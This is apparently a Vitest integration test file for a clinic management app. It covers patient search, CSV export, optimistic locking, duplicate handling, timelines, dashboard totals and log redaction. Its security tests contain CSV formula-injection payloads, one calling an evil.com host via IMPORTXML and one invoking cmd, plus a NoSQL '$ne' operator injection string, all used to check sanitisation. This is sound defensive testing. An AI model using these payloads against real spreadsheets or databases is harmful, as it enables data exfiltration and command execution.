import { describe, it, expect, beforeAll, afterAll, beforeEach } from 'vitest';
import mongoose, { Types } from 'mongoose';
import { setupTestReplSet, teardownTestReplSet, clearTestDatabase } from '../integration/test-db-helper';
import { runWithTenantContext, systemScope, systemAdminScope, TenantActor } from '@/lib/tenancy';
import { clock } from '@/lib/clock';
import { clinicDate } from '@/lib/date';
import { Patient } from '@/models/Patient';
import { Visit } from '@/models/Visit';
import { Appointment } from '@/models/Appointment';
import { FollowUp } from '@/models/FollowUp';
import { Bill } from '@/models/Bill';
import { Payment } from '@/models/Payment';
import { Prescription } from '@/models/Prescription';
import { Estimate } from '@/models/Estimate';
import { AuditLog, AuditAction } from '@/models/AuditLog';
import { searchPatients } from '@/lib/patient-search-service';
import { updatePatient, dismissDuplicate, PatientVersionConflictError } from '@/lib/patient-update-service';
import { buildPatientTimeline } from '@/lib/timeline-builder';
import { generatePatientsCsv, sanitizeCsvCell, escapeCsvCell, formatAgeDisplay } from '@/lib/csv-writer';
import { getDashboardData } from '@/lib/dashboard-service';
import { collectionsForDay } from '@/lib/payment-service';
import { redactSensitiveData, logger } from '@/lib/logger';

describe('Phase 6: Patients, Timeline, CSV Export & Dashboard Service Tests', () => {
  let clinicA: mongoose.Types.ObjectId;
  let clinicB: mongoose.Types.ObjectId;
  const doctorActorA: TenantActor = { type: 'USER', id: 'doc_susheel_p6' };
  const doctorActorB: TenantActor = { type: 'USER', id: 'doc_other_p6' };

  beforeAll(async () => {
    await setupTestReplSet();
  });

  afterAll(async () => {
    await teardownTestReplSet();
  });

  beforeEach(async () => {
    await clearTestDatabase();
    clinicA = new Types.ObjectId();
    clinicB = new Types.ObjectId();
  });

  // ==========================================
  // F3: PATIENT SEARCH TESTS
  // ==========================================
  describe('F3: Patient Search Service', () => {
    it('finds patients by name prefix (English and Devanagari), phone forms, and code', async () => {
      await systemScope(clinicA, async () => {
        // Patient 1: English name
        await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000101',
          name: 'Rahul Sharma',
          searchName: 'rahul sharma',
          phone: '9822123456',
          sex: 'Male',
          ageYears: 32,
          source: 'WALK_IN',
          consentAt: clock.now(),
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });

        // Patient 2: Devanagari name
        await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000102',
          name: 'राहुल चव्हाण',
          searchName: 'राहुल चव्हाण',
          phone: '9822998877',
          sex: 'Male',
          ageYears: 45,
          source: 'WEBSITE',
          consentAt: clock.now(),
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });

        // Patient 3: Other clinic patient (must never match)
        await Patient.create({
          clinicId: clinicB,
          patientCode: 'P-000103',
          name: 'Rahul Clinic B',
          searchName: 'rahul clinic b',
          phone: '9822123456',
          sex: 'Male',
          ageYears: 29,
          source: 'WALK_IN',
          consentAt: clock.now(),
          consentTextVersion: '1.0',
          createdBy: doctorActorB,
        });

        // Patient 4: Soft-deleted patient (must be excluded)
        await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000104',
          name: 'Rahul Deleted',
          searchName: 'rahul deleted',
          phone: '9822554433',
          sex: 'Male',
          ageYears: 30,
          deletedAt: clock.now(),
          consentAt: clock.now(),
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });
      });

      // 1. Name prefix English: "rah"
      const res1 = await searchPatients({ clinicId: clinicA.toString(), q: 'rah' });
      expect(res1.patients.length).toBe(1);
      expect(res1.patients[0].name).toBe('Rahul Sharma');

      // 2. Name prefix Devanagari: "राहु"
      const res2 = await searchPatients({ clinicId: clinicA.toString(), q: 'राहु' });
      expect(res2.patients.length).toBe(1);
      expect(res2.patients[0].name).toBe('राहुल चव्हाण');

      // 3. Code search: "P-000101", "101", "p-101"
      const resCode1 = await searchPatients({ clinicId: clinicA.toString(), q: 'P-000101' });
      expect(resCode1.patients.length).toBe(1);
      expect(resCode1.patients[0].patientCode).toBe('P-000101');

      const resCode2 = await searchPatients({ clinicId: clinicA.toString(), q: '101' });
      expect(resCode2.patients.length).toBe(1);
      expect(resCode2.patients[0].patientCode).toBe('P-000101');

      const resCode3 = await searchPatients({ clinicId: clinicA.toString(), q: 'p-101' });
      expect(resCode3.patients.length).toBe(1);
      expect(resCode3.patients[0].patientCode).toBe('P-000101');

      // 4. Phone search: full number, +91 prefix, 0 prefix, last 4 digits
      const resPhone1 = await searchPatients({ clinicId: clinicA.toString(), q: '9822123456' });
      expect(resPhone1.patients.length).toBe(1);

      const resPhone2 = await searchPatients({ clinicId: clinicA.toString(), q: '+91 9822123456' });
      expect(resPhone2.patients.length).toBe(1);

      const resPhone3 = await searchPatients({ clinicId: clinicA.toString(), q: '09822123456' });
      expect(resPhone3.patients.length).toBe(1);

      const resPhone4 = await searchPatients({ clinicId: clinicA.toString(), q: '3456' });
      expect(resPhone4.patients.length).toBe(1);

      // 5. Tenancy isolation: Clinic B search does not find Clinic A records
      const resClinicB = await searchPatients({ clinicId: clinicB.toString(), q: 'rah' });
      expect(resClinicB.patients.length).toBe(1);
      expect(resClinicB.patients[0].name).toBe('Rahul Clinic B');
    });

    it('neutralizes regex metacharacters and rejects injection payloads', async () => {
      // Metacharacters should not crash or match everything
      const resMeta = await searchPatients({ clinicId: clinicA.toString(), q: '.*+?^${}()|[]\\' });
      expect(resMeta.patients).toEqual([]);

      // Operator injection attempt throws PlainInputViolation
      await expect(
        searchPatients({ clinicId: clinicA.toString(), q: '{"$ne": null}' as any })
      ).rejects.toThrow();
    });
  });

  // ==========================================
  // F4 & F5: CSV EXPORT & FORMULA INJECTION
  // ==========================================
  describe('F4 & F5: CSV Export Writer & Sanitization', () => {
    it('escapes formula injection prefixes with a leading single quote', () => {
      // Equals
      expect(sanitizeCsvCell('=SUM(A1:A10)')).toBe("'=SUM(A1:A10)");
      // Plus
      expect(sanitizeCsvCell('+cmd|"/C calc"!A0')).toBe("'+cmd|\"/C calc\"!A0");
      // Minus
      expect(sanitizeCsvCell('-123+456')).toBe("'-123+456");
      // At
      expect(sanitizeCsvCell('@IMPORTXML("http://evil.com","//a")')).toBe("'@IMPORTXML(\"http://evil.com\",\"//a\")");
      // Tab
      expect(sanitizeCsvCell('\ttext')).toBe("'\ttext");
      // Carriage return
      expect(sanitizeCsvCell('\rtext')).toBe("'\rtext");

      // Plain digits, phone numbers, and normal texts are NOT modified
      expect(sanitizeCsvCell('9822001122')).toBe('9822001122');
      expect(sanitizeCsvCell('1250.50')).toBe('1250.50');
      expect(sanitizeCsvCell('Rahul Sharma')).toBe('Rahul Sharma');
    });

    it('implements RFC 4180 quoting and preserves Devanagari text with BOM', () => {
      const csv = generatePatientsCsv([
        {
          patientCode: 'P-000101',
          name: 'Sharma, Rahul "Dentist"',
          ageDisplay: '30 Y',
          sex: 'Male',
          phone: '9822123456',
          source: 'WALK_IN',
          registeredDate: '2026-10-25',
          lastVisitDate: '2026-10-25',
          visitCount: 2,
          outstandingBalancePaise: 150000,
        },
        {
          patientCode: 'P-000102',
          name: 'राहुल चव्हाण',
          ageDisplay: '40 Y',
          sex: 'Male',
          phone: '9822998877',
          source: 'WEBSITE',
          registeredDate: '2026-10-25',
          lastVisitDate: '',
          visitCount: 1,
          outstandingBalancePaise: 0,
        },
      ]);

      // UTF-8 BOM must be at index 0
      expect(csv.charCodeAt(0)).toBe(0xfeff);

      // CRLF line endings
      expect(csv).toContain('\r\n');

      // Double quotes inside cells are escaped as ""
      expect(csv).toContain('"Sharma, Rahul ""Dentist"""');

      // Amounts formatted with 2 decimal places
      expect(csv).toContain('1500.00');
      expect(csv).toContain('0.00');

      // Devanagari preserved
      expect(csv).toContain('राहुल चव्हाण');
    });
  });

  // ==========================================
  // F7 & F8: PATIENT EDIT & AGE DISPLAY
  // ==========================================
  describe('F7 & F8: Patient Profile & Optimistic Locking', () => {
    it('rejects stale version update with 409 and increments version on success', async () => {
      let patientId: string = '';
      await systemScope(clinicA, async () => {
        const p = await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000201',
          name: 'Original Patient',
          searchName: 'original patient',
          phone: '9822112233',
          sex: 'Male',
          ageYears: 25,
          source: 'MANUAL',
          version: 1,
          consentAt: clock.now(),
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });
        patientId = p._id.toString();
      });

      // 1. Successful update from version 1 -> increments to version 2
      const updated = await updatePatient({
        clinicId: clinicA.toString(),
        patientId,
        version: 1,
        updates: {
          name: 'Updated Name',
          medicalNotes: 'Diabetic patient',
        },
        doctorActor: doctorActorA,
      });

      expect(updated.name).toBe('Updated Name');
      expect(updated.searchName).toBe('updated name');
      expect(updated.version).toBe(2);

      // 2. Stale update attempting version 1 again throws PatientVersionConflictError
      await expect(
        updatePatient({
          clinicId: clinicA.toString(),
          patientId,
          version: 1,
          updates: { name: 'Conflict Overwrite' },
          doctorActor: doctorActorA,
        })
      ).rejects.toThrow(PatientVersionConflictError);
    });

    it('F8: age display never auto-increments recorded age, and DOB computes from clock', () => {
      // Recorded ageYears does not auto-increment
      const ageOnly = formatAgeDisplay({
        ageYears: 35,
        createdAt: '2026-01-15T00:00:00.000Z',
      });
      expect(ageOnly).toBe('Age 35 (as recorded on 2026-01-15)');

      // DOB calculates dynamically against current clock
      const dobDisplay = formatAgeDisplay({
        dob: '1996-10-25',
        createdAt: '2026-10-25T00:00:00.000Z',
      });
      expect(dobDisplay).toBe('30 Y');
    });
  });

  // ==========================================
  // F9: DUPLICATE DETECTION & DISMISS
  // ==========================================
  describe('F9: Duplicate Detection & Dismissal', () => {
    it('detects duplicate on name/phone, permits family members sharing phone, and audits dismissal', async () => {
      let patient1Id: string = '';
      let patient2Id: string = '';

      await systemScope(clinicA, async () => {
        const p1 = await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000301',
          name: 'Pooja Joshi',
          searchName: 'pooja joshi',
          phone: '9822334455',
          sex: 'Female',
          ageYears: 28,
          source: 'WALK_IN',
          consentAt: clock.now(),
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });
        patient1Id = p1._id.toString();

        // Similar name + same phone -> flagged as possible duplicate
        const p2 = await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000302',
          name: 'Puja Joshi',
          searchName: 'puja joshi',
          phone: '9822334455',
          sex: 'Female',
          ageYears: 28,
          source: 'WALK_IN',
          possibleDuplicateOf: p1._id,
          consentAt: clock.now(),
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });
        patient2Id = p2._id.toString();
      });

      // Dismiss duplicate
      const dismissed = await dismissDuplicate({
        clinicId: clinicA.toString(),
        patientId: patient2Id,
        doctorActor: doctorActorA,
      });

      expect(dismissed.duplicateDismissed).toBe(true);

      // Verify DUPLICATE_DISMISS audit entry exists
      const auditEntry = await systemScope(clinicA, async () => {
        return AuditLog.findOne({
          clinicId: clinicA,
          action: AuditAction.DUPLICATE_DISMISS,
          entityId: patient2Id,
        });
      });
      expect(auditEntry).toBeDefined();
    });
  });

  // ==========================================
  // F10: TIMELINE FEED BUILDER
  // ==========================================
  describe('F10: Timeline Feed Builder', () => {
    it('returns chronological feed of all record types, marks VOID prescriptions, and paginates', async () => {
      let patientId: string = '';
      const now = clock.now();

      await systemScope(clinicA, async () => {
        const p = await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000401',
          name: 'Timeline Patient',
          searchName: 'timeline patient',
          phone: '9822445566',
          sex: 'Male',
          ageYears: 30,
          source: 'WALK_IN',
          consentAt: now,
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });
        patientId = p._id.toString();

        const v = await Visit.create({
          clinicId: clinicA,
          patientId: p._id,
          date: clinicDate(now),
          token: 1,
          type: 'WALK_IN',
          status: 'COMPLETED',
          checkInAt: new Date(now.getTime() - 3600000),
          reasonForVisit: 'Consultation and scaling',
          caseSheet: {
            chiefComplaint: 'Toothache',
            diagnosis: 'Pulpitis',
            findings: [],
            investigations: [],
            treatmentPlan: [],
            procedureNotes: 'Scaling done',
            advice: 'Soft diet',
          },
          version: 1,
          createdBy: doctorActorA,
        });

        // Void prescription
        await Prescription.create({
          clinicId: clinicA,
          visitId: v._id,
          patientId: p._id,
          rxNumber: 'RX/2026-27/0001',
          date: new Date(now.getTime() - 1800000),
          items: [],
          status: 'VOID',
          voidReason: 'Dosage revised',
          version: 1,
          createdBy: doctorActorA,
        });

        // Bill
        await Bill.create({
          clinicId: clinicA,
          patientId: p._id,
          billNo: 'BILL/2026-27/0001',
          items: [{ description: 'Scaling', qty: 1, unitPrice: 100000, amount: 100000 }],
          total: 100000,
          paid: 100000,
          balance: 0,
          status: 'PAID',
          createdBy: doctorActorA,
        });
      });

      const timeline = await buildPatientTimeline({
        clinicId: clinicA.toString(),
        patientId,
        limit: 10,
      });

      expect(timeline.items.length).toBeGreaterThanOrEqual(3);
      // Prescription should be marked VOID
      const rxItem = timeline.items.find((i) => i.type === 'PRESCRIPTION');
      expect(rxItem).toBeDefined();
      expect(rxItem?.badge).toBe('VOID');
      expect(rxItem?.summary).toContain('VOID');
    });
  });

  // ==========================================
  // F1 & F2: DASHBOARD METRICS & RECONCILIATION
  // ==========================================
  describe('F1 & F2: Dashboard Service & Financial Reconciliation', () => {
    it('reconciles raw aggregates with dashboard numbers', async () => {
      const now = clock.now();
      const today = clinicDate(now);

      await systemScope(clinicA, async () => {
        const p1 = await Patient.create({
          clinicId: clinicA,
          patientCode: 'P-000501',
          name: 'Dashboard Patient 1',
          searchName: 'dashboard patient 1',
          phone: '9822881122',
          sex: 'Male',
          ageYears: 30,
          source: 'WALK_IN',
          consentAt: now,
          consentTextVersion: '1.0',
          createdBy: doctorActorA,
        });

        // 1. Visit: In Consultation
        await Visit.create({
          clinicId: clinicA,
          patientId: p1._id,
          date: today,
          token: 1,
          type: 'WALK_IN',
          status: 'IN_CONSULTATION',
          checkInAt: now,
          reasonForVisit: 'Consult',
          caseSheet: {
            chiefComplaint: '',
            diagnosis: '',
            findings: [],
            investigations: [],
            treatmentPlan: [],
            procedureNotes: '',
            advice: '',
          },
          version: 1,
          createdBy: doctorActorA,
        });

        // 2. Bill: Active with balance
        const b1 = await Bill.create({
          clinicId: clinicA,
          patientId: p1._id,
          billNo: 'BILL/2026-27/0002',
          items: [{ description: 'Consultation', qty: 1, unitPrice: 200000, amount: 200000 }],
          total: 200000,
          paid: 120000,
          balance: 80000,
          status: 'PARTIAL',
          createdBy: doctorActorA,
        });

        // 3. Payment 1: Completed ₹1200 (120000 paise)
        await Payment.create({
          clinicId: clinicA,
          billId: b1._id,
          receiptNo: 'REC/2026-27/0001',
          receivedAt: now,
          amount: 120000,
          method: 'UPI',
          isReversal: false,
          createdBy: doctorActorA,
        });

        // 4. Payment 2: Reversed ₹300 (-30000 paise)
        await Payment.create({
          clinicId: clinicA,
          billId: b1._id,
          receiptNo: 'REC/2026-27/0002',
          receivedAt: now,
          amount: -30000,
          method: 'CASH',
          isReversal: true,
          reversalReason: 'Wrong entry',
          createdBy: doctorActorA,
        });
      });

      // Get dashboard numbers
      const dash = await getDashboardData(clinicA.toString());

      // Independent raw collections check
      const collectionsReport = await runWithTenantContext(
        { clinicId: clinicA, actor: doctorActorA },
        async () => collectionsForDay(clinicA.toString(), today)
      );

      // F2 Assertions:
      expect(dash.cards.collectionsToday).toBe(90000);
      expect(dash.cards.collectionsToday).toBe(collectionsReport.netTotal);
      expect(dash.cards.outstandingBalance).toBe(80000);
      expect(dash.cards.inConsultation).toBe(1);
    });
  });

  // ==========================================
  // F12: REDACTION TESTS
  // ==========================================
  describe('F12: Redaction of search terms and PII', () => {
    it('redacts search terms, names, and phone numbers in logger', () => {
      const entry = logger.info('Search executed', {
        search: 'Secret Name',
        q: '9822123456',
        patientName: 'Jane Doe',
      });

      expect(entry.search).toBe('[REDACTED]');
      expect(entry.q).toBe('[REDACTED]');
      expect(entry.patientName).toBe('[REDACTED]');
    });

    it('redacts URL query strings containing ?q= or &q=', () => {
      const url = 'http://localhost:3000/api/patients?q=JohnDoe&page=1';
      const clean = redactSensitiveData(url);
      expect(clean).toBe('http://localhost:3000/api/patients?q=[REDACTED]&page=1');
    });
  });
});
